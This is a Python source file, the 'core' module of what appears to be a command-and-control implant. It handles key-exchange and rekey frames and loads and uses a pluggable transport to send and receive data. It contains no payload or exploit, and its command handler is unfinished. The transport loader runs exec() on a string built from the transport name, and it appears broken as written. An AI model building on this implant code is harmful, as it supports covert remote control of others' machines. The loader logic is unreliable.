# ядро - core
from lib import instructions
from lib import transmit
from lib.crypto import asymmetric


def init(frame, component):
    """
    Initialization frame received, sending self manifest

    :param frame: Initialization frame
    :param component:
    :return:
    """
    data = {'component_id': component.component_id, "cmd": "ii", "args": [component.manifest, {"ipk": component.initial_public_key._public_key}],
            "txid": frame['txid']}
    component.current_lp_pubkey = asymmetric.public_key_from_bytes(frame['args'][0]['lpk'])
    return data


def rekey(frame, component):
    """
    Rekey request received

    :param frame:
    :param component:
    :return:
    """
    data = init(frame, component)
    component.current_lp_pubkey = asymmetric.public_key_from_bytes(frame['args'][0]['lpk'])
    component.current_private_key = component.initial_private_key
    component.current_public_key = component.initial_public_key

    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(component, instruction_frame)
    return reply_frame


def getcmd(frame, component):
    # TODO: Implement me
    return None


def import_transport_for_implant(component, transport_name, transport_config):
    import_string = f"import transports.{transport_name} as transport"
    transport_config['logging'] = component.logging
    exec(import_string)
    try:
        # I know this is fucking weird, but you find a better way to do this then
        implant_transport = transport.Transport()
        component.transport = implant_transport
        component.logging.log(f"Imported {transport_name}",
                              level="debug", source="lib.yadro")
        transport.prep_transport(transport_config)
    except ImportError:
        component.logging.log(f"{transport_name} not found!, attempted import",
                              level="error", source="lib.yadro")

def relay_reply(component, reply):
    # TODO: Cook the command
    try:
        component.transport.send_data(reply)
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when relaying: {e}",
                              level="critical", source=f"lib.yadro")


def retrieve_output(component):
    # TODO: uncook data
    try:
        component.transport.recv_data()
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when retrieving data: {e}",
                              level="critical", source=f"lib.yadro")
